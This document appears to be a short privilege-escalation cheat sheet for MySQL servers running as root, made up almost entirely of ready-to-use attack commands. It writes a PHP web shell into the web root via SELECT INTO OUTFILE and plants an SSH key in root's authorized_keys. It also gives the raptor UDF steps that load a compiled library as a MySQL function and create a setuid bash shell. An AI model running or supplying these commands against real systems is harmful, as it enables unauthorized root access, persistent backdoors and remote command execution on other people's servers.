# MySQL Running as Root — SELECT INTO OUTFILE RCE

If MySQL runs as root, use `SELECT INTO OUTFILE` to write a PHP webshell or SSH key to disk.

```bash
# Confirm MySQL runs as root
ps aux | grep mysql

# Connect with known creds (from app config, .env, etc.)
mysql -u <USER> -p'<PASS>' -h 127.0.0.1

# Write webshell (if web root is writable)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# Write SSH key to root's authorized_keys
SELECT "ssh-rsa AAAA..." INTO OUTFILE '/root/.ssh/authorized_keys';
# May need: CREATE TABLE t (v TEXT); INSERT INTO t VALUES('...'); SELECT v FROM t INTO OUTFILE ...

# Raptor UDF exploit (compile shared library, load as UDF)
# 1. Download raptor_udf2.c, compile: gcc -g -c raptor_udf2.c -fPIC -o raptor_udf2.o && gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
# 2. In MySQL:
USE mysql;
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('cp /bin/bash /tmp/b; chmod +s /tmp/b');
```
